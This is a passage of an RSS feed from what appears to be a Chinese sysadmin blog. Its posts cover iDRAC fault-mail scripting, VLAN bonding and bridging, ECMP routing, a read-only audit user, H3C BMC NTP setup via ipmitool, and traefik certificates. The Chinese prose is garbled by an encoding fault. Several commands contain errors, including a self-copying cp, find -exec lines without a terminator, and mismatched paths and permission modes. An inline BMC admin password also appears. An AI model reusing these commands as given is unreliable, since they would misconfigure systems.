&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;beginline&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;sortarray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[((&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-1))]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;endline&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;sortarray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[((&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+1))]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$endline&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;nv&#34;&gt;endline&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;nv&#34;&gt;endline&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$((&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$endline&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    sed -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$beginline&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$endline&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; p&amp;#34;&lt;/span&gt; /tmp/idrac.txt &amp;gt;&amp;gt; /tmp/idracout.txt 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  /usr/local/bin/mailsend -to &lt;span class=&#34;s2&#34;&gt;&amp;#34;zhangranrui@ddky.com&amp;#34;&lt;/span&gt; -from monit@ddky.com -ssl -port &lt;span class=&#34;m&#34;&gt;465&lt;/span&gt; -auth -auth-plan -smtp smtp.exmail.qq.com -sub &lt;span class=&#34;s2&#34;&gt;&amp;#34;IDCæœºå™¨ç¡¬ä»¶æ•…éšœ&amp;#34;&lt;/span&gt; -v -user &lt;span class=&#34;s2&#34;&gt;&amp;#34;monit@ddky.com&amp;#34;&lt;/span&gt; -pass &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt; -cs &lt;span class=&#34;s2&#34;&gt;&amp;#34;gb2312&amp;#34;&lt;/span&gt; -enc-type &lt;span class=&#34;s2&#34;&gt;&amp;#34;base64&amp;#34;&lt;/span&gt; -M &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;cat /tmp/idracout.txt&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Linuxä¸‹bondå’Œbrå»ºç«‹vlançš„æ–¹æ³•</title>
      <link>https://rendoumi.com/posts/20231227-vlan_bond_br/</link>
      <pubDate>Wed, 27 Dec 2023 11:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231227-vlan_bond_br/</guid>
      <description>&lt;p&gt;æˆ‘ä»¬çš„å®¿ä¸»æœºä¸Šåšäº†4ç½‘å¡bondingï¼Œç„¶åéœ€è¦ä¸Šå‡åˆ°brï¼Œä¸¤ä¸ªç½‘å¡éƒ½éœ€è¦åšä¸Švlanã€‚&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚172.18.30.1ï¼Œæƒ³åœ¨ä¸Šé¢å¢åŠ ä¸€ä¸ªVLANæ®µ202ï¼Œç„¶ååœ¨ä¸Šé¢ç”Ÿäº§ä¸€å°è™šæœº172.18.19.2&lt;/p&gt;
&lt;p&gt;å°±éœ€è¦å¢åŠ ä¸€ä¸ªbond0.202ä»¥åŠbr0.202&lt;/p&gt;
&lt;p&gt;åšæ³•å¦‚ä¸‹:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /etc/sysconfig/network-scripts
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp ifcfg-bond0.199 ifcfg-bond0.202
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi ifcfg-bond0.202
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;DEVICE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bond0.202
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ONBOOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;USERCTL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;BRIDGE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br0.202
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;VLAN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp ifcfg-br0.199 ifcfg-br0.199
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi ifcfg-br0.202
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;DEVICE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br0.202
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;BOOTPROTO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;static
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ONBOOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Bridge
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå¯åŠ¨è¿™ä¸¤ä¸ªç½‘å¡ï¼Œå¯åŠ¨é¡ºåºå¾ˆé‡è¦ï¼ï¼ï¼&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifup bond0.202
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifup br0.202
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼Œæ‰§è¡Œå®Œä»¥ååŠ¡å¿…æ£€æŸ¥ä¸€ä¸‹ä¸¤ä¸ªç½‘å¡æ˜¯å¦UP&lt;/p&gt;
&lt;p&gt;ç„¶åäº§è™šæœºå°±å¥½&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./vm.sh create -b br0.202 -c &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; -m &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; -d &lt;span class=&#34;m&#34;&gt;40&lt;/span&gt;  -i 172.18.19.2 -k 255.255.255.0 -g 172.18.19.254 -q 172.18.30.1 -r 172.18.30.2 ucarp-18-19-2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Linuxä¸‹ECMPç­‰ä»·è·¯ç”±çš„å»ºç«‹</title>
      <link>https://rendoumi.com/posts/20231227-linux_ecmp/</link>
      <pubDate>Wed, 27 Dec 2023 10:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231227-linux_ecmp/</guid>
      <description>&lt;p&gt;æˆ‘ä»¬æœ‰ä¸¤ä¸ªå‡ºå£ï¼Œä¸€ä¸ªä»æ— é”¡å‡ºï¼Œä¸€ä¸ªä»ä¸–çºªäº’è”å‡º&lt;/p&gt;
&lt;p&gt;è¿™å°æœºå™¨çš„em1æ¥ä¸–çºªäº’è”ï¼Œem2æ¥æ— é”¡å°šèˆªï¼Œä¸¤ä¸ªç½‘å…³ï¼Œæœ‰ipv6å’Œipv4&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ISP 1:
    Gateways:
        172.16.9.254
        2001:db8:a::1
    Interface: em1
	
ISP 2:
    Gateways:
        172.18.9.254
        2001:db8:b::1
    Interface: em2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é‚£ä¹ˆè¿™å°æœºå™¨çš„ECMPç­‰ä»·è·¯ç”±è¿™ä¹ˆåšï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ip route replace default proto static scope global \
    nexthop dev em1 via 172.16.9.254 weight 1 \
    nexthop dev em2 via 172.18.9.254 weight 1

ip -6 route replace default proto static scope global \
    nexthop dev em1 via 2001:db8:a::1 weight 1 \
    nexthop dev em2 via 2001:db8:b::1 weight 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸¤æ¡å‘½ä»¤éœ€è¦æ”¾åˆ° /etc/rc.d/rc.locl æˆ–è€…ifupé‡Œé¢å»&lt;/p&gt;</description>
    </item>
    <item>
      <title>å®¡è®¡éœ€æ±‚åªè¯»ç”¨æˆ·çš„å»ºç«‹</title>
      <link>https://rendoumi.com/posts/20231227-supdev_logview/</link>
      <pubDate>Wed, 27 Dec 2023 09:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231227-supdev_logview/</guid>
      <description>&lt;p&gt;å®¡è®¡çš„è¦æ±‚ï¼š&lt;/p&gt;
&lt;p&gt;çº¿ä¸Šç¯å¢ƒç ”å‘åªèƒ½æœ‰åªè¯»æƒé™&lt;/p&gt;
&lt;p&gt;é‚£åªèƒ½æ›²çº¿æ•‘å›½äº†ï¼Œä¸¤ä¸ªç”¨æˆ·ï¼Œsupdevæ˜¯è¿ç»´ç”¨æ¥ç®¡ç†çš„ï¼Œlogviewæ˜¯ç ”å‘ç”¨æ¥åªè¯»æ—¥å¿—çš„&lt;/p&gt;
&lt;h3 id=&#34;ä¸€é¦–å…ˆç¡®å®šç³»ç»Ÿæœ‰supdevç”¨æˆ·å­˜åœ¨&#34;&gt;ä¸€ã€é¦–å…ˆç¡®å®šç³»ç»Ÿæœ‰supdevç”¨æˆ·å­˜åœ¨&lt;/h3&gt;
&lt;p&gt;id supdev
é€šå¸¸supdevçš„idæ˜¯511&lt;/p&gt;
&lt;h3 id=&#34;äºŒå¢åŠ æ–°ç”¨æˆ·logview&#34;&gt;äºŒã€å¢åŠ æ–°ç”¨æˆ·logview&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬ç¡®å®šlogviewçš„idæ˜¯512ï¼Œgroupæ˜¯å’ŒsupdevåŒç»„
useradd -u 512 -g supdev logview&lt;/p&gt;
&lt;h3 id=&#34;ä¸‰ç¨‹åºçš„appä»¥åŠæ•°æ®ç›®å½•ä¸æ˜¯åœ¨supdevçš„homeç›®å½•ä¸‹è€Œæ˜¯åœ¨dataserversä¸‹&#34;&gt;ä¸‰ã€ç¨‹åºçš„appä»¥åŠæ•°æ®ç›®å½•ä¸æ˜¯åœ¨supdevçš„homeç›®å½•ä¸‹ï¼Œè€Œæ˜¯åœ¨/data/serversä¸‹&lt;/h3&gt;
&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬æŠŠ/data/serversä¸‹çš„ç›®å½•éƒ½æ”¹æˆ750ï¼Œæ–‡ä»¶éƒ½æ”¹æˆ640&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#!/bin/sh
find /export/servers/ -type d ! -perm 0750 -exec chmod 0750 {}
find /export/servers/ -type f ! -perm 0640 -exec chmod 0640 {}
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# ansible æ¨¡å—
- name: make dirs 0755
  command: find {{ your_path }} -type d ! -perm 0750 -exec chmod 0750 {} \;

- name: make files 0644
  command: find {{ your_path }} -type f ! -perm 0640 -exec chmod 0640 {} \;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿™æ ·å°±å¯ä»¥äº†ã€‚logviewå¯ä»¥å»åˆ°/data/serversç›®å½•ï¼Œå¯ä»¥çœ‹æ–‡ä»¶ï¼Œä½†æ— æ³•æ‰§è¡Œã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>H3CæœåŠ¡çš„BIOSä¸»æ¿è®¾ç½®ä¸­å¦‚ä½•æ­£ç¡®è®¾ç½®NTPæœåŠ¡å™¨</title>
      <link>https://rendoumi.com/posts/20231226-h3c_ntp/</link>
      <pubDate>Tue, 26 Dec 2023 11:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231226-h3c_ntp/</guid>
      <description>&lt;p&gt;H3CæœåŠ¡å™¨ä¸»æ¿æ—¶é—´ä¸å‡†ç¡®ä¹Ÿå¾ˆè®¨åŒï¼Œçœ‹ä¸»æ¿æ—¥å¿—æ—¶é—´éƒ½æ˜¯é”™çš„ï¼Œæ²¡åŠæ³•ï¼Œä¿®æ”¹ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;H3CæœåŠ¡å™¨BIOSçš„NTPè®¾ç½®æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;ä¿®æ”¹ä¸»æœåŠ¡å™¨ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x01 æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸²
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¿®æ”¹è¾…æœåŠ¡å™¨ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x02 æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸²
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¿®æ”¹ç¬¬ä¸‰ä¸ªæœåŠ¡å™¨ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ipmitool -I lanplus -H 10.18.$1 -U admin -P Password@_ raw 0x32 0xA8 0x05 æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸²
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ–¹æ³•å¾ˆç®€å•ï¼Œä½†æ˜¯æœåŠ¡å™¨åçš„HEXå­—ç¬¦ä¸²å¦‚ä½•å¾—åˆ°ï¼Ÿ&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo -n &amp;#34;172.18.30.1&amp;#34; | od -A n -t x1 | sed  &amp;#34;s/ / 0x/g&amp;#34;
0x31 0x37 0x32 0x2e 0x31 0x38 0x2e 0x33 0x30 0x2e 0x31
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¿®æ”¹NTPæœåŠ¡å™¨1ä¸º172.18.30.1&lt;/p&gt;</description>
    </item>
    <item>
      <title>traefiké…ç½®digicertå®¶å¾—æ³›åŸŸåè¯ä¹¦</title>
      <link>https://rendoumi.com/posts/20231221-traefik_digicert/</link>
      <pubDate>Thu, 21 Dec 2023 11:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231221-traefik_digicert/</guid>
      <description>&lt;p&gt;traefikä½¿ç”¨digicertä»˜è´¹çš„è¯ä¹¦å’Œä½¿ç”¨letencryptå…è´¹è¯ä¹¦çš„æ–¹æ³•ä¸ä¸€æ ·ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€ä¹ˆé…ç½®ï¼š&lt;/p&gt;
&lt;p&gt;traefik.ymlé‡Œé¢å°±æ²¡æœ‰ä»»ä½•é…ç½®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;level&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;DEBUG&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;api&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;insecure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;dashboard&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;entryPoints&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;:80&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#http:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#  redirections:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#    entryPoint:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#      to: https&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#      scheme: https&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;:443&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;providers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;directory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/export/servers/traefik/dynamic&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
